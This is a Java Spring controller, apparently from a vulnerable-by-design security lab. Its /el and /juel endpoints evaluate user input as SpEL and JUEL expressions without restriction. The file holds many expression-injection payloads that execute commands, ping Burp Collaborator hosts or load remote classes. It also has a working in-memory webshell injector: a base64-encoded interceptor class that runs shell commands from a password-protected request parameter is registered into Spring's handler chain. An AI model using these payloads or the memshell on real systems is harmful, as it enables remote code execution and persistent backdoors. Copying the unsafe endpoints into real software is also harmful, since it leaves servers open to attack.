package org.joychou.controller;

import org.flowable.common.engine.api.variable.VariableContainer;
import org.flowable.engine.impl.el.ProcessExpressionManager;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.el.ELProcessor;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.LinkedHashSet;


@RestController
public class EL {

    @RequestMapping("/el")
    public String el(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        return parser.parseExpression(expression).getValue().toString();
    }

    @RequestMapping("/juel")
    public String juel(String expression) {
//        String payload = "${''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('java.lang.Runtime.getRuntime().exec(\"notepad\")')}";


        Object result = new ProcessExpressionManager().createExpression(expression).getValue(new VariableContainer() {
            @Override
            public boolean hasVariable(String s) {
                return false;
            }

            @Override
            public Object getVariable(String s) {
                return null;
            }

            @Override
            public void setVariable(String s, Object o) {

            }

            @Override
            public void setTransientVariable(String s, Object o) {

            }

            @Override
            public String getTenantId() {
                return null;
            }
        });

        return result.toString();
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
//        String payload = "''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('ping 1uwnjnqpo6cyg9g825afrsvunltphe.burpcollaborator.net')\")";
//        String payload = "''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('calc.exe')";
//        String payload = "''.getClass().forName('java.net.InetAddress').getMethod('getByName',''.getClass()).invoke('','ylnkakhmf33v7675t21cipmreikl8a.burpcollaborator.net')";
//        String payload = "\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance([\"ping\",\"p0qbpbwduuimmxmw8tg3xg1it9zen3.burpcollaborator.net\"]).start()";
        String payload = "${\"\".getClass().forName(\"java.net.InetAddress\").getMethod(\"getByName\",\"\".getClass()).invoke(\"\",\"if1444b69nxf1q1pnmvwc9gb82e12q.burpcollaborator.net\")}\n";
//        String payload = "\"\".getClass().forName(\"java.net.InetSocketAddress\").getDeclaredConstructors()[2].newInstance([\"uqoimkc58pr8g1oe5i7ai71lyc4bs0.burpcollaborator.net\",80])";
//        String payload = "\"\".getClass().forName(\"java.net.Socket\").getDeclaredConstructors()[9].newInstance(\"uqoimkc58pr8g1oe5i7ai71lyc4bs0.burpcollaborator.net\",Integer.valueOf(80))";
//        String payload = "\"\".getClass().forName(\"org.yaml.snakeyaml.Yaml\").getDeclaredConstructors()[6].newInstance().load(\"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://ej12f45p19ks9lhyy20ubru5rwxwll.burpcollaborator.net/Yaml']]]]\")";
//        String payload = "\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance([\"ping\",\"t3xhzjp4lo47t01dihk9v6ekbbhc51.burpcollaborator.net\"]).start()";
//        String payload = "''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"java.lang.Runtime.getRuntime().exec('ping s0tgwim3in16qzycfgh8s5bj8aee23.burpcollaborator.net')\")";
//        String payload = "''.getClass().forName('java.net.URL').getDeclaredConstructors()[2].newInstance('http://kl98ha7v3fmybrj40820dxwbt2ztvhk.burpcollaborator.net/URL').openStream()";
//        String payload = "''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('java.lang.Runtime.getRuntime().exec(\"calc\")')";

//        String payload = "''.getClass().forName('jdk.jshell.JShell').getMethod('create').invoke(null).eval('new java.lang.ProcessBuilder().command(\"cmd /c calc\".split(\" \")).start()')";

        // 调用loadClass之前不会发出http请求，调用之后才发出。
//        new URLClassLoader(new URL[]{new URL("http://bp4zl1bm76qpfinv4z6rho02xt3kw8l.burpcollaborator.net")}, "".getClass().getClassLoader()).loadClass("EvilBB01");

//        String[] payloads = new String[]{
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[0].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[1].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[2].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[3].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[4].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[5].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[6].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[7].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[8].toString()",
//                "''.getClass().forName('java.net.URL').getDeclaredConstructors()[9].toString()",
//        };
        ELProcessor processor = new ELProcessor();
//
////        String payload = "''.getClass().forName('org.yaml.snakeyaml.Yaml').getDeclaredConstructors()[0].toString()";
//        for (int i = 0; i < payloads.length; i++) {
//            System.out.println(processor.eval(payloads[i]).toString());
//        }

//        System.out.println(processor.eval(payload).toString());

//        (new java.io.FileOutputStream("/home/cqq/result.txt")).write((new java.lang.ProcessBuilder("ls","-al").start().getInputStream().readAllBytes()));
//        new java.lang.ProcessBuilder("cmd","/c","calc").start();
//        List<SnippetEvent> eval = JShell.create().eval();
//        Process process = (Process) processor.eval(payload);
//        InputStream inputStream = process.getInputStream();
//        StringBuilder stringBuilder2 = new StringBuilder();
//        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
//        String line;
//        while((line = bufferedReader.readLine()) != null) {
//            stringBuilder2.append(line).append("\n");
//        }
//
//        String result = stringBuilder2.toString();
//        System.out.println(result);

//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        java.net.URL url = new URL("http://localhost:8080/com/SpringMemShell.class");
        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
        classLoader.loadClass("com.SpringMemShell");
    }

    static void injectMemShell(){

        try{
            // 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
            Field field = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            // 2. 属性被 private 修饰，所以 setAccessible true
            field.setAccessible(true);
            // 3. 获取一个 ApplicationContext 实例
            WebApplicationContext context =(WebApplicationContext) ((LinkedHashSet)field.get(null)).iterator().next();

            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean("requestMappingHandlerMapping");
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(abstractHandlerMapping);

            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class clazz = null;
            try{
                clazz = classLoader.loadClass("com.feihong.ldap.template.DynamicInterceptorTemplate2");
            }catch(ClassNotFoundException e){
                try{
                    String codeClass = "yv66vgAAADQBGQoAQQCDCACECQBAAIUKAEAAhgkAhwCICACJCgCKAIsIAIwLAI0AjggAjwoADwCQCgAPAJEJAJIAkwgAlAcAlQgAlggAlwgAmAgAmQcAmgoAmwCcCgCbAJ0KAJ4AnwoAFACgCAChCgAUAKIKABQAowsApAClCgCmAIsKAKcAqAoApwCpCACqCgAnAKsJAEAArAcArQgArgoArwCwCgCxALIHALMIALQHALUHAGMJALYAtwoAKQC4CgC5ALoHALsKALYAvAoAuQC9BwC+CgAxAL8HAMAKADMAvwcAwQoANQC/CADCCgDDAMQKAMUAxgcAxwcAyAoAOwDJBwDKCgCvAMsKAMwAzQcAzgcAzwEAEm15Q2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAQYmFzaWNDbWRTaGVsbFB3ZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA3TGNvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUyOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAWsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADVN0YWNrTWFwVGFibGUHAJUHAFABAApFeGNlcHRpb25zBwDQAQAKaW5pdGlhbGl6ZQEABHZhcjcBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjb2RlAQAFYnl0ZXMBAAJbQgEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEdmFyOAEAIkxqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbjsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAEdmFyOQEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBAAV2YXIxMQEALUxqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uOwcAzgcAswcArQcA0QcAvgcAwAcAwQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAMY2xhc3NDb250ZW50AQABZQEAH0xqYXZhL2lvL0ZpbGVOb3RGb3VuZEV4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAARhcmdzAQASYmFzZTY0Q2xhc3NDb250ZW50BwDHBwDKAQAKU291cmNlRmlsZQEAIER5bmFtaWNJbnRlcmNlcHRvclRlbXBsYXRlMi5qYXZhAQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMAEYARwEABHBhc3MMAEQARQwAXgBHBwDSDADTANQBACJbK10gRHluYW1pYyBJbnRlcmNlcHRvciBzYXlzIGhlbGxvBwDVDADWANcBAAR0eXBlBwDYDADZANoBAAViYXNpYwwA2wDcDADdAN4HAN8MAOAARQEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQADY21kAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcA4QwA4gDjDADkAOUHAOYMAOcA6AwARgDpAQACXEEMAOoA6wwA7ADtBwDuDADvAPAHAPEHAPIMAPMA9AwA9QD2AQAnY29tLmZlaWhvbmcubGRhcC50ZW1wbGF0ZS5NeUNsYXNzTG9hZGVyDAD3APgMAEIAQwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQMceXY2NnZnQUFBRElBR3dvQUJRQVdCd0FYQ2dBQ0FCWUtBQUlBR0FjQUdRRUFCanhwYm1sMFBnRUFHaWhNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU95bFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFFa3h2WTJGc1ZtRnlhV0ZpYkdWVVlXSnNaUUVBQkhSb2FYTUJBQ2xNWTI5dEwyWmxhV2h2Ym1jdmJHUmhjQzkwWlcxd2JHRjBaUzlOZVVOc1lYTnpURzloWkdWeU93RUFBV01CQUJkTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPd0VBQzJSbFptbHVaVU5zWVhOekFRQXNLRnRDVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQVZpZVhSbGN3RUFBbHRDQVFBTFkyeGhjM05NYjJGa1pYSUJBQXBUYjNWeVkyVkdhV3hsQVFBU1RYbERiR0Z6YzB4dllXUmxjaTVxWVhaaERBQUdBQWNCQUNkamIyMHZabVZwYUc5dVp5OXNaR0Z3TDNSbGJYQnNZWFJsTDAxNVEyeGhjM05NYjJGa1pYSU1BQThBR2dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBRnloYlFrbEpLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBQ0VBQWdBRkFBQUFBQUFDQUFBQUJnQUhBQUVBQ0FBQUFEb0FBZ0FDQUFBQUJpb3J0d0FCc1FBQUFBSUFDUUFBQUFZQUFRQUFBQVFBQ2dBQUFCWUFBZ0FBQUFZQUN3QU1BQUFBQUFBR0FBMEFEZ0FCQUFrQUR3QVFBQUVBQ0FBQUFFUUFCQUFDQUFBQUVMc0FBbGtydHdBREtnTXF2cllBQkxBQUFBQUNBQWtBQUFBR0FBRUFBQUFJQUFvQUFBQVdBQUlBQUFBUUFCRUFFZ0FBQUFBQUVBQVRBQTRBQVFBQkFCUUFBQUFDQUJVPQcA+QwA+gD9BwD+DAD/AQABABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcBAQwBAgBDDAEDAQQHANEMAQUBBgEAEGphdmEvbGFuZy9PYmplY3QMAQcBCAwBCQEKAQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgwBCwBHAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQBfQzpccmVwb3NcSk5ESUV4cGxvaXRcdGFyZ2V0XGNsYXNzZXNcY29tXGZlaWhvbmdcbGRhcFx0ZW1wbGF0ZVxEeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZTIuY2xhc3MHAQwMAQ0BDgcBDwwBEAERAQAdamF2YS9pby9GaWxlTm90Rm91bmRFeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwARgESAQATamF2YS9pby9JT0V4Y2VwdGlvbgwBEwEVBwEWDAEXARgBADVjb20vZmVpaG9uZy9sZGFwL3RlbXBsYXRlL0R5bmFtaWNJbnRlcmNlcHRvclRlbXBsYXRlMgEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9IYW5kbGVySW50ZXJjZXB0b3JBZGFwdGVyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lzRW1wdHkBAAMoKVoBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldERlY29kZXIBAAdEZWNvZGVyAQAMSW5uZXJDbGFzc2VzAQAcKClMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEABmRlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQATamF2YS9uaW8vZmlsZS9QYXRocwEAA2dldAEAOyhMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25pby9maWxlL1BhdGg7AQATamF2YS9uaW8vZmlsZS9GaWxlcwEADHJlYWRBbGxCeXRlcwEAGChMamF2YS9uaW8vZmlsZS9QYXRoOylbQgEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAGGphdmEvdXRpbC9CYXNlNjQkRW5jb2RlcgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwAhAEAAQQAAAAIAAgBCAEMAAAACAEQARQAAAAQAAQBGAEcAAQBIAAAARQACAAEAAAAPKrcAASoSArUAAyq3AASxAAAAAgBJAAAAEgAEAAAAFgAEABQACgAXAA4AGABKAAAADAABAAAADwBLAEwAAAABAE0ATgACAEgAAAFOAAQABwAAAJ+yAAUSBrYABysSCLkACQIAxgCNKxIIuQAJAgASCrYAC5kAfSsqtAADuQAJAgA6BBkExgBsGQS2AAyaAGSyAA0SDrYAC5kAGwa9AA9ZAxIQU1kEEhFTWQUZBFM6BacAGAa9AA9ZAxISU1kEEhNTWQUZBFM6BbsAFFm4ABUZBbYAFrYAF7cAGBIZtgAatgAbOgYsuQAcAQAZBrYAHQOsBKwAAAADAEkAAAAuAAsAAAAbAAgAHQAjAB4ALwAfADwAIQBHACIAXwAkAHQAJwCQACgAmwApAJ0ALQBKAAAAUgAIAFwAAwBPAFAABQB0ACkATwBQAAUAkAANAFEARQAGAC8AbgBSAEUABAAAAJ8ASwBMAAAAAACfAFMAVAABAAAAnwBVAFYAAgAAAJ8AVwBYAAMAWQAAABEAA/wAXwcAWvwAFAcAW/kAKABcAAAABAABAF0AAgBeAEcAAQBIAAABtgAHAAcAAACJuAAetgAfTCorEiC2ACG1ACKnAGdNEiROuAAlLbYAJjoEAToFEicSKAa9AClZAxIqU1kEsgArU1kFsgArU7YALDoFGQUEtgAtKhkFKwa9AC5ZAxkEU1kEA7gAL1NZBRkEvrgAL1O2ADDAACm1ACKnAAo6BhkGtgAypwAQTCu2ADSnAAhMK7YANrEABAAHABEAFAAjACQAbgBxADEAAAB4AHsAMwAAAHgAgwA1AAMASQAAAFIAFAAAADIABwA1ABEAQgAUADYAFQA3ABgAOAAhADkAJAA8AEIAPQBIAD4AbgBBAHEAPwBzAEAAeABHAHsAQwB8AEQAgABHAIMARQCEAEYAiABJAEoAAABcAAkAcwAFAF8AYAAGABgAYABhAEUAAwAhAFcAYgBjAAQAJABUAGQAZQAFABUAYwBmAGcAAgAHAHEAaABpAAEAfAAEAGoAawABAIQABABsAG0AAQAAAIkASwBMAAAAWQAAAEEABv8AFAACBwBuBwBvAAEHAHD/AFwABgcAbgcAbwcAcAcAWgcAKgcAcQABBwBy/wAGAAEHAG4AAEIHAHNHBwB0BAAJAHUAdgABAEgAAADWAAMAAwAAADQSNwO9AA+4ADi4ADlMpwAXTbsAO1kstwA8v027ADtZLLcAPL+4AD4rtgA/TbIABSy2AAexAAIAAAANABAAOgAAAA0AGgA9AAMASQAAACYACQAAAE4ADQBTABAATwARAFAAGgBRABsAUgAkAFUALABWADMAVwBKAAAAPgAGAA0AAwB3AGMAAQARAAkAeAB5AAIAGwAJAHgAegACAAAANAB7AFAAAAAkABAAdwBjAAEALAAIAHwARQACAFkAAAAQAANQBwB9SQcAfvwACQcAKgADAH8AAAACAIAAgQAAAAYAAQCCAAAA/AAAABIAAgCxAK8A+wAJAMwArwEUAAk=";
                    byte[] bytes = java.util.Base64.getDecoder().decode(codeClass);

                    Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                    method.setAccessible(true);
                    clazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
                }catch (Exception ex){
                    ex.printStackTrace();
                }
            }

            adaptedInterceptors.add(clazz.newInstance());
    } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        }
    }
}


